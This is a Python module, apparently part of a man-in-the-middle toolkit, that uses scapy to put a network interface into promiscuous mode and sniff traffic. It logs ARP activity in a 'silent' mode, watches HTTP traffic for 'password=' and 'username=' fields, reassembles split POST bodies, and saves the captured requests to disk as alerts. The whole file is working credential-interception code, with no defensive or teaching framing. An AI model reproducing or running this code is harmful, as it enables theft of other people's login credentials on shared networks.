import scapy.all as scapy
import uuid
import time
from . import STATUS, STOP_EVENT, CAPTURE_DIR
from .utils import log_msg

# Track streams where we saw a POST header but no body yet
interesting_streams = {} 

def packet_callback(packet):
    if STOP_EVENT.is_set(): return
    
    # --- CONFIG ---
    is_silent = (STATUS.get("mode") == "SILENT")

    # --- FILTERING ---
    # We accept TCP (Data) OR ARP (Logs)
    has_data = packet.haslayer(scapy.Raw) and packet.haslayer(scapy.TCP)
    is_arp = packet.haslayer(scapy.ARP)
    
    if not (has_data or is_arp):
        return

    try:
        # --- A. ARP MONITORING ---
        # We log ARP packets only in Silent Mode to show "Activity"
        if is_arp and is_silent:
            op = packet[scapy.ARP].op
            src_ip = packet[scapy.ARP].psrc
            dst_ip = packet[scapy.ARP].pdst
            
            if op == 1: 
                log_msg(f"[SNIFFER] ARP Who has {dst_ip}? Tell {src_ip}")
            elif op == 2: 
                log_msg(f"[SNIFFER] ARP Reply: {src_ip} is at {packet[scapy.ARP].hwsrc}")
            return # Done with ARP

        # --- B. DATA CAPTURE (TCP/HTTP) ---
        # This part now runs for Silent Mode too!
        if has_data:
            payload = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
            ip = packet[scapy.IP]
            tcp = packet[scapy.TCP]
            
            # Filter proxy noise
            if tcp.sport == 10000 or tcp.dport == 10000: return 

            # --- CLASSIFICATION ---
            title = ""
            desc = ""
            type_class = "INFO"
            is_alert = False
            
            stream_key = (ip.src, tcp.sport)
            current_time = time.time()

            # Scenario 1: Credentials Found
            if "password=" in payload or "username=" in payload:
                title = "POST REQUEST" 
                if "\r\n\r\n" in payload:
                    _, desc = payload.split('\r\n\r\n', 1)
                else:
                    desc = payload
                desc = desc.strip()
                type_class = "ALERT" 
                is_alert = True
                if stream_key in interesting_streams: del interesting_streams[stream_key]

            # Scenario 2: POST Header
            elif "POST " in payload:
                if payload.endswith("\r\n\r\n"):
                    interesting_streams[stream_key] = current_time
                    title = "POST DETECTED"
                    desc = "Header captured. Waiting for body..."
                    type_class = "INFO"
                    is_alert = True
                else:
                    title = "POST REQUEST"
                    try:
                        _, desc = payload.split('\r\n\r\n', 1)
                    except:
                        desc = "Form Data Found"
                    type_class = "INFO"
                    is_alert = True

            # Scenario 3: Split Packet
            elif stream_key in interesting_streams:
                if current_time - interesting_streams[stream_key] < 3.0:
                    title = "POST BODY"
                    desc = payload
                    type_class = "ALERT"
                    is_alert = True
                    del interesting_streams[stream_key] 
                else:
                    del interesting_streams[stream_key] 
                    return

            # Scenario 4: Standard GET
            elif "GET " in payload:
                title = "PAGE LOAD"
                desc = payload.split('\r\n')[0]
                type_class = "INFO"
                is_alert = True

            # Scenario 5: Server Responses
            elif payload.startswith("HTTP/"):
                title = "SERVER RESPONSE"
                try: desc = payload.split('\r\n')[0]
                except: desc = "Server Status"
                type_class = "WARNING" 
                is_alert = True

            else:
                return 

            # --- DUPLICATE CHECK ---
            if not is_alert: return
            if len(STATUS["intercepted_data"]) > 0:
                last_entry = STATUS["intercepted_data"][-1]
                if last_entry["src"] == ip.src and last_entry["title"] == title:
                    if last_entry["snippet"] == desc:
                        return 

            # --- SAVE & LOG ---
            timestamp_str = time.strftime('%H%M%S')
            clean_ip = ip.src.replace('.', '-')
            clean_title = title.replace(" ", "-").upper()
            short_uuid = str(uuid.uuid4())[:4]
            readable_id = f"{timestamp_str}_{clean_ip}_{clean_title}_{short_uuid}"
            
            try:
                filepath = f"{CAPTURE_DIR}/{readable_id}.html"
                with open(filepath, "w", encoding="utf-8") as f: f.write(payload)
            except: pass

            data_entry = {
                "id": readable_id,
                "time": time.strftime('%H:%M:%S'),
                "src": ip.src, 
                "dst": ip.dst,
                "title": title,          
                "snippet": desc, 
                "type": type_class
            }
            
            STATUS["intercepted_data"].append(data_entry)
            STATUS["all_intercepted_data"].append(data_entry)
            
            # Log Alerts to Console
            if type_class == "ALERT":
                log_msg(f"[!] {title} captured from {ip.src}")

    except Exception:
        pass

def start_sniffer():
    interface = STATUS["interface"]
    from .utils import set_promiscuous_mode 
    set_promiscuous_mode(interface, True)
    try:
        # Store=0 prevents RAM usage buildup
        scapy.sniff(iface=interface, store=0, prn=packet_callback, 
                   stop_filter=lambda p: STOP_EVENT.is_set())
    except Exception as e:
        log_msg(f"[!] Sniffer Error: {e}")
    finally:
        set_promiscuous_mode(interface, False)